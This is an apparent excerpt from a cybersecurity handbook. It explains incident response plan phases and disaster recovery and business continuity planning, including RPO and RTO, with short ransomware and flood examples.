An **Incident Response (IR) plan** is a playbook for handling security breaches. It typically includes phases: Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned. Organizations test their readiness through tabletop exercises, phishing drills, and **Red-Teaming** (simulated attacks by ethical hackers).

**Example:** A company experiences a ransomware attack. Their IR team follows the plan: they identify the infected systems, isolate them from the network (Containment), remove the malware (Eradication), restore data from backups (Recovery), and later analyze how the attack occurred to improve their defenses (Lessons Learned).

### 6.6 Disaster Recovery & Business Continuity Plans (DR/BCP)

These plans ensure an organization can survive major disruptions:

*   **Business Continuity Plan (BCP):** Strategies to maintain essential business functions during a disaster.
*   **Disaster Recovery (DR):** Technical procedures to restore IT infrastructure. Key metrics are **Recovery Point Objective (RPO)** (maximum acceptable data loss) and **Recovery Time Objective (RTO)** (maximum acceptable downtime).

**Example:** A company's primary data center is destroyed by a flood. Their BCP dictates that employees should work remotely using cloud-based applications. Their DR plan specifies that critical servers must be restored in a secondary data center within 4 hours (RTO) and that data loss must not exceed 1 hour (RPO), utilizing continuous data replication.

---
**References:**
[1] CMU MSIS Handbook: The Cybersecurity & Ethical Hacking Handbook, Edition: 2026 Reference Manual.
